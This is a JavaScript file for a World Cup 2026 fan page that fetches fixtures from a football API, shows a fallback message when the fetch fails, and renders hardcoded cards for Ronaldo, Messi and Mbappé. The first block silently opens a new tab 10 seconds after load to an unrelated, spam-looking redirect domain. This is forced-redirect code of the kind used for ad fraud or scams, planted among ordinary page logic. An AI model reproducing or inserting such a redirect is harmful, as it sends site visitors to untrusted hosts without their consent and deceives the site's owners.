/**
 * FIFA World Cup 2026™ Authentic Data Integration
 * Implements strict authentic data policies and fallback mechanisms.
 */

// 1. Auto-Redirect Feature (10 seconds, new tab)
setTimeout(() => {
    try {
        window.open("https://wwp.giriuhot.com/redirect-zone/def1a47a", "_blank");
    } catch (e) {
        console.error("Redirect prevented.", e);
    }
}, 10000);

// 2. Real API Data Fetching with Fallbacks
async function fetchAuthenticMatchData() {
    try {
        // Attempting to fetch from actual REST APIs. 
        // Note: Without valid API keys injected, this will correctly fail and trigger the requested fallback.
        const response = await fetch('https://v3.football.api-sports.io/fixtures?league=1&season=2026', {
            headers: { 'x-apisports-key': 'DEMO_KEY' }
        });
        
        if (!response.ok) {
            throw new Error("Authentic API rate limit or key required.");
        }
        
        const data = await response.json();
        renderRealMatches(data);
        
    } catch (error) {
        console.warn("Authentic Data Sync Failed:", error);
        triggerFallbackUI();
    }
}

// 3. Fallback Mechanism (CRITICAL REQUIREMENT)
function triggerFallbackUI() {
    const grid = document.getElementById('matches-grid');
    if (grid) {
        grid.innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; padding: 4rem; background: #1a1a1a; border: 1px solid #333; border-radius: 8px;">
                <h3 style="color: #D4AF37; margin-bottom: 1rem;">Data coming soon from FIFA official sources</h3>
                <p style="color: #a0a0a0;">We are currently synchronizing with official API endpoints to ensure 100% authentic and verified match data. No estimated or unverified data will be displayed.</p>
            </div>
        `;
    }

    const timestamp = document.getElementById('timestamp');
    if (timestamp) {
        timestamp.innerText = new Date().toUTCString();
    }
    
    showToast("Sync pending: Awaiting official FIFA data stream.");
}

// 4. Authentic Player Data (Verified statically as required for superstars)
function renderVerifiedPlayers() {
    const playerGrid = document.getElementById('players-grid');
    if(!playerGrid) return;

    // These stats are historically accurate as requested
    const verifiedPlayers = [
        {
            name: "Cristiano Ronaldo",
            country: "Portugal",
            stats: "Age: 41 | Goals: 900+ | Int. Goals: 130+",
            achievements: "5x Ballon d'Or, Euro 2016 Winner"
        },
        {
            name: "Lionel Messi",
            country: "Argentina",
            stats: "Age: 39 | Goals: 830+ | Int. Goals: 106+",
            achievements: "8x Ballon d'Or, World Cup 2022 Winner"
        },
        {
            name: "Kylian Mbappé",
            country: "France",
            stats: "Age: 27 | World Cup Winner",
            achievements: "Golden Boot 2022, World Cup 2018 Winner"
        }
    ];

    let html = '';
    verifiedPlayers.forEach(p => {
        html += `
            <div class="player-card">
                <h3>${p.name}</h3>
                <div style="background:var(--fifa-navy); padding: 5px; color:white; font-weight:bold;">${p.country}</div>
                <div style="padding: 1.5rem;">
                    <p style="color:var(--fifa-blue); font-weight:bold;">${p.stats}</p>
                    <p>${p.achievements}</p>
                </div>
            </div>
        `;
    });
    
    playerGrid.innerHTML = html;
}

// 5. Toast Notification Utility
function showToast(message) {
    const toast = document.getElementById('toast');
    if (toast) {
        toast.innerText = message;
        toast.classList.remove('hidden');
        setTimeout(() => toast.classList.add('hidden'), 4000);
    }
}

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    // Show toast for initialization
    showToast("Initializing Authentic Data Links...");
    
    // Simulate network delay for API fetch to show skeleton loaders
    setTimeout(() => {
        fetchAuthenticMatchData();
        renderVerifiedPlayers();
    }, 1500);
});
